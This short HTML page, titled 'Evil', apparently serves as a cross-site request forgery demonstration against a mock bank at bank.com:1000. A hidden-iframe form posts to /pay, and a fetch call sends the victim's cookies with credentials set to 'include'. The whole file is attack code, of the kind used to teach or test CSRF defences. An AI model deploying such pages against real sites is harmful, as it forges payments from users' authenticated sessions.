<html xmlns="http://www.w3.org/1999/html">
    <head>
        <title>Evil</title>
    </head>
    <body>
        <div id="root">
            <h1>ðŸ˜ˆ Hello, Evil!</h1>
            <div class="actions">
                <button id="auth">auth</button>
                <button id="pay">pay</button>
                <form target="iframe" action="http://bank.com:1000/pay" method="POST" style="display: inline-block">
                    <input type="submit" value="trap"/>
                </form>
                <iframe name="iframe" style="display: none"></iframe>
            </div>
        </div>
        <script>
            const baseApi = 'http://bank.com:1000';
            const params = {
                method: 'POST',
                headers: {
                    'Content-Type':'application/json'
                },
            }
            // auth
            document.getElementById('auth').onclick = () => {
                fetch(`${baseApi}/auth`, params)
                    .then(response => response.json())
                    .then(data => alert(data.status));
            }
            // pay
            document.getElementById('pay').onclick = () => {
                fetch(`${baseApi}/pay`, { ...params, credentials: "include" })
                    .then(response => response.json())
                    .then(data => alert(data.status));
            }
        </script>
    </body>
</html>
